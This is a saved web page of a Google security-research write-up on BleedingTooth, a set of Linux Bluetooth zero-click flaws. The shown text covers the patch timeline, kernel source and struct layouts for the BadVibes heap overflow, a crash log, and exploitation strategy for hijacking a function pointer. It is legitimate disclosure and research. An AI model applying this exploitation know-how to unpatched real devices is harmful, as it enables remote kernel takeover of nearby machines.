<!DOCTYPE html>
<!-- saved from url=(0075)https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup -->
<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution | security-research</title>
<meta name="generator" content="Jekyll v3.9.0">
<meta property="og:title" content="BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution">
<meta property="og:locale" content="en_US">
<meta name="description" content="This project hosts security advisories and their accompanying proof-of-concepts related to research conducted at Google which impact non-Google owned code.">
<meta property="og:description" content="This project hosts security advisories and their accompanying proof-of-concepts related to research conducted at Google which impact non-Google owned code.">
<link rel="canonical" href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html">
<meta property="og:url" content="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html">
<meta property="og:site_name" content="security-research">
<meta name="twitter:card" content="summary">
<meta property="twitter:title" content="BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution">
<script type="application/ld+json">
{"description":"This project hosts security advisories and their accompanying proof-of-concepts related to research conducted at Google which impact non-Google owned code.","url":"https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html","@type":"WebPage","headline":"BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

    <style class="anchorjs"></style><link rel="stylesheet" href="./2021 - BleedingTooth Linux Bluetooth Zero-Click Remote Code Execution_files/style.css">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/security-research/favicon.ico" -->

<!-- end custom head snippets -->

  </head>
  <body>
    <div class="container-lg px-3 my-5 markdown-body">
      
      <h1><a href="https://google.github.io/security-research/">security-research</a></h1>
      

      <h1 id="bleedingtooth-linux-bluetooth-zero-click-remote-code-execution">BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution</h1>

<p align="right">Andy Nguyen (theflow@) - Information Security Engineer</p>

<p><em>BleedingTooth</em> is a set of zero-click vulnerabilities in the Linux Bluetooth subsystem that can allow an unauthenticated remote attacker in short distance to execute arbitrary code with kernel privileges on vulnerable devices.</p>

<h2 id="table-of-contents">Table of Contents<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#table-of-contents" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<ul>
  <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#introduction">Introduction</a>
    <ul>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#patching-severity-and-advisories">Patching, Severity and Advisories</a></li>
    </ul>
  </li>
  <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#vulnerabilities">Vulnerabilities</a>
    <ul>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#badvibes-heap-based-buffer-overflow-cve-2020-24490">BadVibes: Heap-Based Buffer Overflow (CVE-2020-24490)</a></li>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#badchoice-stack-based-information-leak-cve-2020-12352">BadChoice: Stack-Based Information Leak (CVE-2020-12352)</a></li>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#badkarma-heap-based-type-confusion-cve-2020-12351">BadKarma: Heap-Based Type Confusion (CVE-2020-12351)</a></li>
    </ul>
  </li>
  <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#exploitation">Exploitation</a>
    <ul>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#bypassing-badkarma">Bypassing BadKarma</a></li>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#exploring-sk_filter">Exploring sk_filter()</a></li>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#finding-a-heap-primitive">Finding a Heap Primitive</a></li>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#controlling-the-out-of-bounds-read">Controlling the Out-Of-Bounds Read</a></li>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#leaking-the-memory-layout">Leaking the Memory Layout</a></li>
      <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#plugging-it-all-together">Plugging It All Together</a>
        <ul>
          <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#achieving-rip-control">Achieving RIP Control</a></li>
          <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#kernel-stack-pivoting">Kernel Stack Pivoting</a></li>
          <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#kernel-rop-chain-execution">Kernel ROP Chain Execution</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#proof-of-concept">Proof-Of-Concept</a></li>
  <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#timeline">Timeline</a></li>
  <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#conclusion">Conclusion</a></li>
  <li><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#thanks">Thanks</a></li>
</ul>

<h2 id="introduction">Introduction<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#introduction" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<p>I noticed that the network subsystem was already being fuzzed extensively by <a href="https://github.com/google/syzkaller">syzkaller</a>, but that subsystems like Bluetooth were less well covered. In general, research on the Bluetooth host attack surface seemed to be quite limited – with most public vulnerabilities in Bluetooth only affecting the <a href="https://www.armis.com/bleedingbit/">firmware</a> or the <a href="https://knobattack.com/">specification</a> itself, and only allowing attackers to eavesdrop and/or manipulate information.</p>

<p>But what if attackers could take full control over devices? The most prominent examples that demonstrated this scenario were <a href="https://www.armis.com/blueborne/">BlueBorne</a> and <a href="https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/">BlueFrag</a>. I set myself the goal to research the Linux Bluetooth stack, to extend upon BlueBorne’s findings, and to extend syzkaller with the capability to fuzz the <code class="language-plaintext highlighter-rouge">/dev/vhci</code> device.</p>

<p>This blogpost describes the process of me diving into the code, uncovering high severity vulnerabilities, and ultimately chaining them into a fully-fledged RCE exploit targeting x86-64 Ubuntu 20.04.1 (<a href="https://youtu.be/qPYrLRausSw">video</a>).</p>

<h3 id="patching-severity-and-advisories">Patching, Severity and Advisories<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#patching-severity-and-advisories" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>Google reached out directly to <a href="http://www.bluez.org/">BlueZ</a> and the Linux Bluetooth Subsystem maintainers (Intel), rather than to the Linux Kernel Security team in order to coordinate the multi-party response for this series of vulnerabilities. Intel issued the security advisory <a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00435.html">INTEL-SA-00435</a> with the patches, but these weren’t included in any released Kernel versions at the time of disclosure. The Linux Kernel Security team should have been notified in order to facilitate coordination, and any future vulnerabilities of this type will also be reported to them. A timeline of the communications is at the bottom of this post. The patches for the respective vulnerabilities are:</p>

<ul>
  <li><a href="https://github.com/google/security-research/security/advisories/GHSA-ccx2-w2r4-x649">BadVibes</a> (CVE-2020-24490) was fixed on the mainline branch on 2020-Jul-30: <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=a2ec905d1e160a33b2e210e45ad30445ef26ce0e">commit</a>.</li>
  <li><a href="https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq">BadChoice</a> (CVE-2020-12352) and <a href="https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq">BadKarma</a> (CVE-2020-12351) were fixed on bluetooth-next on 2020-Sep-25: commits <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=eddb7732119d53400f48a02536a84c509692faa8">1</a>, <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=f19425641cb2572a33cb074d5e30283720bd4d22">2</a>, <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08">3</a>, <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b560a208cda0297fef6ff85bbfd58a8f0a52a543">4</a></li>
</ul>

<p>Alone, the severity of these vulnerabilities <strong>vary from medium to high, but combined they represent a serious security risk.</strong> This write-up goes over these risks.</p>

<h2 id="vulnerabilities">Vulnerabilities<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#vulnerabilities" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<p>Let’s briefly describe the Bluetooth stack. The Bluetooth chip communicates with the host (the operating system) using the HCI (Host Controller Interface) protocol. Common packets are:</p>

<ul>
  <li>Command packets – Sent by the host to the controller.</li>
  <li>Event packets – Sent by the controller to the host to notify about events.</li>
  <li>Data packets – Usually carry L2CAP (Logical Link Control and Adaptation protocol) packets, which implement the transport layer.</li>
</ul>

<p>Higher-level protocols such as A2MP (AMP Manager Protocol) or SMP (Security Management Protocol) are built on top of L2CAP. In the Linux implementation, all these protocols are exposed without authentication, and vulnerabilities there are crucial since some of these protocols even live inside the kernel.</p>

<h3 id="badvibes-heap-based-buffer-overflow-cve-2020-24490">BadVibes: Heap-Based Buffer Overflow (CVE-2020-24490)<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#badvibes-heap-based-buffer-overflow-cve-2020-24490" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>I discovered the first vulnerability (introduced in Linux kernel 4.19) by manually reviewing the HCI event packet parsers. HCI event packets are crafted and sent by the Bluetooth chip and usually cannot be controlled by attackers (unless they have control over the Bluetooth firmware as well). However, there are two very similar methods, <code class="language-plaintext highlighter-rouge">hci_le_adv_report_evt()</code> and <code class="language-plaintext highlighter-rouge">hci_le_ext_adv_report_evt()</code>, whose purposes are to parse advertisement reports coming from remote Bluetooth devices. These reports are variable in size.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">hci_le_adv_report_evt</span><span class="p">(</span><span class="k">struct</span> <span class="n">hci_dev</span> <span class="o">*</span><span class="n">hdev</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">u8</span> <span class="n">num_reports</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

	<span class="n">hci_dev_lock</span><span class="p">(</span><span class="n">hdev</span><span class="p">);</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">num_reports</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">hci_ev_le_advertising_info</span> <span class="o">*</span><span class="n">ev</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
		<span class="n">s8</span> <span class="n">rssi</span><span class="p">;</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">ev</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">&lt;=</span> <span class="n">HCI_MAX_AD_LENGTH</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">rssi</span> <span class="o">=</span> <span class="n">ev</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">ev</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">];</span>
			<span class="n">process_adv_report</span><span class="p">(</span><span class="n">hdev</span><span class="p">,</span> <span class="n">ev</span><span class="o">-&gt;</span><span class="n">evt_type</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="o">-&gt;</span><span class="n">bdaddr</span><span class="p">,</span>
					   <span class="n">ev</span><span class="o">-&gt;</span><span class="n">bdaddr_type</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">rssi</span><span class="p">,</span>
					   <span class="n">ev</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">ev</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="n">bt_dev_err</span><span class="p">(</span><span class="n">hdev</span><span class="p">,</span> <span class="s">"Dropping invalid advertising data"</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="n">ptr</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">ev</span><span class="p">)</span> <span class="o">+</span> <span class="n">ev</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">hci_dev_unlock</span><span class="p">(</span><span class="n">hdev</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">hci_le_ext_adv_report_evt</span><span class="p">(</span><span class="k">struct</span> <span class="n">hci_dev</span> <span class="o">*</span><span class="n">hdev</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">u8</span> <span class="n">num_reports</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

	<span class="n">hci_dev_lock</span><span class="p">(</span><span class="n">hdev</span><span class="p">);</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">num_reports</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">hci_ev_le_ext_adv_report</span> <span class="o">*</span><span class="n">ev</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
		<span class="n">u8</span> <span class="n">legacy_evt_type</span><span class="p">;</span>
		<span class="n">u16</span> <span class="n">evt_type</span><span class="p">;</span>

		<span class="n">evt_type</span> <span class="o">=</span> <span class="n">__le16_to_cpu</span><span class="p">(</span><span class="n">ev</span><span class="o">-&gt;</span><span class="n">evt_type</span><span class="p">);</span>
		<span class="n">legacy_evt_type</span> <span class="o">=</span> <span class="n">ext_evt_type_to_legacy</span><span class="p">(</span><span class="n">hdev</span><span class="p">,</span> <span class="n">evt_type</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">legacy_evt_type</span> <span class="o">!=</span> <span class="n">LE_ADV_INVALID</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">process_adv_report</span><span class="p">(</span><span class="n">hdev</span><span class="p">,</span> <span class="n">legacy_evt_type</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="o">-&gt;</span><span class="n">bdaddr</span><span class="p">,</span>
					   <span class="n">ev</span><span class="o">-&gt;</span><span class="n">bdaddr_type</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ev</span><span class="o">-&gt;</span><span class="n">rssi</span><span class="p">,</span>
					   <span class="n">ev</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">ev</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="n">ptr</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">ev</span><span class="p">)</span> <span class="o">+</span> <span class="n">ev</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">hci_dev_unlock</span><span class="p">(</span><span class="n">hdev</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Notice how both methods call <code class="language-plaintext highlighter-rouge">process_adv_report()</code>, but the latter method does not check <code class="language-plaintext highlighter-rouge">ev-&gt;length</code> to see if it is smaller or equal to <code class="language-plaintext highlighter-rouge">HCI_MAX_AD_LENGTH=31</code>. The function <code class="language-plaintext highlighter-rouge">process_adv_report()</code> then invokes <code class="language-plaintext highlighter-rouge">store_pending_adv_report()</code> with the event data and length:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">process_adv_report</span><span class="p">(</span><span class="k">struct</span> <span class="n">hci_dev</span> <span class="o">*</span><span class="n">hdev</span><span class="p">,</span> <span class="n">u8</span> <span class="n">type</span><span class="p">,</span> <span class="n">bdaddr_t</span> <span class="o">*</span><span class="n">bdaddr</span><span class="p">,</span>
			       <span class="n">u8</span> <span class="n">bdaddr_type</span><span class="p">,</span> <span class="n">bdaddr_t</span> <span class="o">*</span><span class="n">direct_addr</span><span class="p">,</span>
			       <span class="n">u8</span> <span class="n">direct_addr_type</span><span class="p">,</span> <span class="n">s8</span> <span class="n">rssi</span><span class="p">,</span> <span class="n">u8</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">u8</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">has_pending_adv_report</span><span class="p">(</span><span class="n">hdev</span><span class="p">))</span> <span class="p">{</span>
		<span class="p">...</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">LE_ADV_IND</span> <span class="o">||</span> <span class="n">type</span> <span class="o">==</span> <span class="n">LE_ADV_SCAN_IND</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">store_pending_adv_report</span><span class="p">(</span><span class="n">hdev</span><span class="p">,</span> <span class="n">bdaddr</span><span class="p">,</span> <span class="n">bdaddr_type</span><span class="p">,</span>
						 <span class="n">rssi</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="p">...</span>
	<span class="p">}</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Finally, the <code class="language-plaintext highlighter-rouge">store_pending_adv_report()</code> subroutine copies the data into <code class="language-plaintext highlighter-rouge">d-&gt;last_adv_data</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">store_pending_adv_report</span><span class="p">(</span><span class="k">struct</span> <span class="n">hci_dev</span> <span class="o">*</span><span class="n">hdev</span><span class="p">,</span> <span class="n">bdaddr_t</span> <span class="o">*</span><span class="n">bdaddr</span><span class="p">,</span>
				     <span class="n">u8</span> <span class="n">bdaddr_type</span><span class="p">,</span> <span class="n">s8</span> <span class="n">rssi</span><span class="p">,</span> <span class="n">u32</span> <span class="n">flags</span><span class="p">,</span>
				     <span class="n">u8</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">u8</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">discovery_state</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">hdev</span><span class="o">-&gt;</span><span class="n">discovery</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">last_adv_data</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
	<span class="n">d</span><span class="o">-&gt;</span><span class="n">last_adv_data_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Looking at <code class="language-plaintext highlighter-rouge">struct hci_dev</code>, we can see that the buffer <code class="language-plaintext highlighter-rouge">last_adv_data</code> has the same size as <code class="language-plaintext highlighter-rouge">HCI_MAX_AD_LENGTH</code> which is not enough to hold the extended advertising data. The parser can theoretically receive and route a packet up to 255 bytes to this method. If that is possible, we could overflow <code class="language-plaintext highlighter-rouge">last_adv_data</code> and corrupt members up to offset 0xbaf.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C hci_dev --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">hci_dev</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="k">struct</span> <span class="n">discovery_state</span> <span class="p">{</span>
		<span class="p">...</span>
		<span class="cm">/* typedef u8 -&gt; __u8 */</span> <span class="kt">unsigned</span> <span class="kt">char</span>      <span class="n">last_adv_data</span><span class="p">[</span><span class="mi">31</span><span class="p">];</span>           <span class="cm">/* 0xab0  0x1f */</span>
		<span class="p">...</span>
	<span class="p">}</span> <span class="n">discovery</span><span class="p">;</span> <span class="cm">/* 0xa68  0x88 */</span>
	<span class="p">...</span>
	<span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span> <span class="n">next</span><span class="p">;</span>                                                 <span class="cm">/* 0xb18   0x8 */</span>
		<span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span> <span class="n">prev</span><span class="p">;</span>                                                 <span class="cm">/* 0xb20   0x8 */</span>
	<span class="p">}</span> <span class="n">mgmt_pending</span><span class="p">;</span> <span class="cm">/* 0xb18  0x10 */</span>
	<span class="p">...</span>
	<span class="cm">/* size: 4264, cachelines: 67, members: 192 */</span>
	<span class="cm">/* sum members: 4216, holes: 17, sum holes: 48 */</span>
	<span class="cm">/* paddings: 10, sum paddings: 43 */</span>
	<span class="cm">/* forced alignments: 1 */</span>
	<span class="cm">/* last cacheline: 40 bytes */</span>
<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__aligned__</span><span class="p">(</span><span class="mi">8</span><span class="p">)));</span>
</code></pre></div></div>

<p>However, is <code class="language-plaintext highlighter-rouge">hci_le_ext_adv_report_evt()</code> even able to receive such a large report? It is likely that larger advertisements are anticipated, because it seems intentional that the extended advertisement parser explicitly removed the 31 bytes check. Also, since it is close to <code class="language-plaintext highlighter-rouge">hci_le_adv_report_evt()</code> in code, that check has likely not been forgotten by mistake. Indeed, looking at the specification, we can see that extending from 31 bytes to 255 bytes is one of Bluetooth 5’s main features:</p>

<blockquote>
  <p>Recall in Bluetooth 4.0, the advertising payload was a maximum of 31 octets. In Bluetooth 5, we’ve increased the payload to 255 octets by adding additional advertising channels and new advertising PDUs.<br>
Source: <a href="https://www.bluetooth.com/blog/exploring-bluetooth5-whats-new-in-advertising/">https://www.bluetooth.com/blog/exploring-bluetooth5-whats-new-in-advertising/</a></p>
</blockquote>

<p>Therefore, this vulnerability is only triggerable if the victim’s machine has a Bluetooth 5 chip (which is relatively “new” technology and only available on newer Laptops) and if the victim is actively scanning for advertisement data (i.e. open the Bluetooth settings and search for devices in the surrounding).</p>

<p>Using two Bluetooth 5-capable devices, we can easily confirm the vulnerability and observe a panic similar to:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[  118.490999] general protection fault: 0000 [#1] SMP PTI
[  118.491006] CPU: 6 PID: 205 Comm: kworker/u17:0 Not tainted 5.4.0-37-generic #41-Ubuntu
[  118.491008] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  118.491034] Workqueue: hci0 hci_rx_work [bluetooth]
[  118.491056] RIP: 0010:hci_bdaddr_list_lookup+0x1e/0x40 [bluetooth]
[  118.491060] Code: ff ff e9 26 ff ff ff 0f 1f 44 00 00 0f 1f 44 00 00 55 48 8b 07 48 89 e5 48 39 c7 75 0a eb 24 48 8b 00 48 39 f8 74 1c 44 8b 06 &lt;44&gt; 39 40 10 75 ef 44 0f b7 4e 04 66 44 39 48 14 75 e3 38 50 16 75
[  118.491062] RSP: 0018:ffffbc6a40493c70 EFLAGS: 00010286
[  118.491066] RAX: 4141414141414141 RBX: 000000000000001b RCX: 0000000000000000
[  118.491068] RDX: 0000000000000000 RSI: ffff9903e76c100f RDI: ffff9904289d4b28
[  118.491070] RBP: ffffbc6a40493c70 R08: 0000000093570362 R09: 0000000000000000
[  118.491072] R10: 0000000000000000 R11: ffff9904344eae38 R12: ffff9904289d4000
[  118.491074] R13: 0000000000000000 R14: 00000000ffffffa3 R15: ffff9903e76c100f
[  118.491077] FS:  0000000000000000(0000) GS:ffff990434580000(0000) knlGS:0000000000000000
[  118.491079] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  118.491081] CR2: 00007feed125a000 CR3: 00000001b860a003 CR4: 00000000003606e0
[  118.491083] Call Trace:
[  118.491108]  process_adv_report+0x12e/0x560 [bluetooth]
[  118.491128]  hci_le_meta_evt+0x7b2/0xba0 [bluetooth]
[  118.491134]  ? __wake_up_sync_key+0x1e/0x30
[  118.491140]  ? sock_def_readable+0x40/0x70
[  118.491143]  ? __sock_queue_rcv_skb+0x142/0x1f0
[  118.491162]  hci_event_packet+0x1c29/0x2a90 [bluetooth]
[  118.491186]  ? hci_send_to_monitor+0xae/0x120 [bluetooth]
[  118.491190]  ? skb_release_all+0x26/0x30
[  118.491207]  hci_rx_work+0x19b/0x360 [bluetooth]
[  118.491211]  ? __schedule+0x2eb/0x740
[  118.491217]  process_one_work+0x1eb/0x3b0
[  118.491221]  worker_thread+0x4d/0x400
[  118.491225]  kthread+0x104/0x140
[  118.491229]  ? process_one_work+0x3b0/0x3b0
[  118.491232]  ? kthread_park+0x90/0x90
[  118.491236]  ret_from_fork+0x35/0x40
</code></pre></div></div>

<p>The panic shows that we can take full control over members within <code class="language-plaintext highlighter-rouge">struct hci_dev</code>. An interesting pointer to corrupt is <code class="language-plaintext highlighter-rouge">mgmt_pending-&gt;next</code>, as it is of the type <code class="language-plaintext highlighter-rouge">struct mgmt_pending_cmd</code> which contains the function pointer <code class="language-plaintext highlighter-rouge">cmd_complete()</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C mgmt_pending_cmd --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">mgmt_pending_cmd</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="kt">int</span>                        <span class="p">(</span><span class="o">*</span><span class="n">cmd_complete</span><span class="p">)(</span><span class="k">struct</span> <span class="n">mgmt_pending_cmd</span> <span class="o">*</span><span class="p">,</span> <span class="n">u8</span><span class="p">);</span>       <span class="cm">/*  0x38   0x8 */</span>

	<span class="cm">/* size: 64, cachelines: 1, members: 8 */</span>
	<span class="cm">/* sum members: 62, holes: 1, sum holes: 2 */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>This handler can, for example, be triggered by aborting the HCI connection. However, in order to successfully redirect the <code class="language-plaintext highlighter-rouge">mgmt_pending-&gt;next</code> pointer, we require an additional information leak vulnerability, as we will learn in the next section.</p>

<h3 id="badchoice-stack-based-information-leak-cve-2020-12352">BadChoice: Stack-Based Information Leak (CVE-2020-12352)<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#badchoice-stack-based-information-leak-cve-2020-12352" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>The <em>BadVibes</em> vulnerability is not powerful enough to be turned into arbitrary R/W primitives, and there seems to be no way to use it to leak the memory layout of the victim. The reason is that the only interesting members that can be corrupted are pointers to circular lists. As the name suggests, these data structures are circular, thus we cannot alter them without ensuring that they eventually point back to where they started. This requirement is hard to fulfil when the memory layout of the victim is randomized. While there are some resources in the kernel that are allocated at static addresses, their contents are most likely not controllable. Therefore, we need to have an idea of the memory layout in the first place in order to exploit <em>BadVibes</em>. To be more concrete, we need to leak some memory addresses of the victim, whose content we can control or at least predict.</p>

<p>Usually, information leaks are achieved by exploiting out-of-bounds accesses, making use of uninitialized variables, or, as recently popular, by performing side-channel/timing attacks. The latter may be difficult to pull off, as transmissions may have jitter. Instead, let’s focus on the first two bug classes and go through all subroutines that send back some information to the attacker, and see if any of them can disclose out-of-bounds data or uninitialized memory.</p>

